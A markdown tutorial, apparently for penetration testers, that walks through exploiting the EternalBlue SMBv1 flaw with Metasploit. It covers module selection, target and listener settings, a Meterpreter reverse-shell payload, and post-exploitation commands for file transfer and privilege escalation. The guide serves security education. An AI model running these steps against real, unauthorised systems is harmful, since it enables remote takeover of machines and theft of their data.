# Exploiting MS17-010 EternalBlue Vulnerability using Metasploit

<details>
<summary><strong>Metasploit</strong></summary>
Metasploit is an open-source penetration testing framework that offers a vast collection of tools and exploits for security testing, vulnerability assessment, and penetration testing. It provides a comprehensive platform for security professionals and researchers to test systems, identify vulnerabilities, and execute various security assessments. Metasploit includes a vast database of exploits, payloads, auxiliary modules, and post-exploitation tools, enabling users to assess the security posture of systems and networks.
</details>

<details>
<summary><strong>Eternal Blue</strong></summary>
EternalBlue is the codename for a critical software vulnerability in Microsoft's Windows operating system discovered by the National Security Agency (NSA) and later leaked by a hacking group. This vulnerability (CVE-2017-0144) affects the Windows Server Message Block (SMB) protocol. EternalBlue exploits a flaw in the SMBv1 protocol, allowing attackers to execute arbitrary code remotely on a vulnerable system without requiring user interaction. It was famously used as part of the WannaCry ransomware attack, highlighting its significance and the need for timely system patching and security measures.
</details>

## 1. Set Up Your Environment
Ensure you have Metasploit installed on your system. You can use Kali Linux, Parrot OS, or install Metasploit manually on your preferred OS.

## 2. Start Metasploit Framework
Open a terminal and launch Metasploit by typing:

```bash
msfconsole
```

Once inside Metasploit, you can search for the EternalBlue module using:

```bash
show module
```

## 3. Search for the MS17-010 EternalBlue Exploit Module
To search for a specific module:

```bash
search ms17-010
```

## 4. Select the Exploit Module
After finding the appropriate exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue), select it by entering:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## 5. Set Required Parameters

Configure necessary parameters by employing the show options command to view and adjust settings as needed. Common options include `RHOSTS`,`LHOST`, `RPORT`, etc.

```bash
set RHOSTS <Target IP>
```
-------------------------------------------------------------------------------
| Parameter | Description                           | Example Usage           |
|-----------|---------------------------------------|-------------------------|
| RHOSTS    | Remote host(s) IP address(es)         | `set RHOSTS 192.168.1.5`|
| LHOST     | Local host listening IP for payloads  | `set LHOST 192.168.1.2` |
| RPORT     | Remote port for the target service    | `set RPORT 445`         |
-------------------------------------------------------------------------------

## 6. Set Payload

After selecting the exploit module, you need to set the payload that will be delivered to the compromised system. This payload determines the action or code executed on the target after exploitation.
For example, to set the payload as a reverse shell for a Windows target:

```bash
set payload windows/meterpreter/reverse_tcp
```

## 7. Execute the Exploit
Once all necessary options are set, run the exploit by typing:

```bash
exploit
```

The exploit might take some time to run. Upon successful exploitation, Metasploit may display the meterpreter prompt, indicating a successful compromise of the target system.

## 8. Post-Exploitation Actions

Once the exploit succeeds and you gain access to the compromised system, you can perform various post-exploitation actions using the `meterpreter` prompt.

### Some useful post-exploitation commands:

- **System Commands**: Execute system commands on the target system using :
  
```bash
shell
```
  
Gather System Information: Retrieve system information like system details, user information, etc. using commands such as `sysinfo`, `getuid`, etc.

File Operations: Manipulate files on the compromised system using commands like `download`, `upload`, `ls`, `cd`, etc.

Privilege Escalation: Attempt to elevate privileges on the target system using modules like `getsystem`, `migrate`, etc.




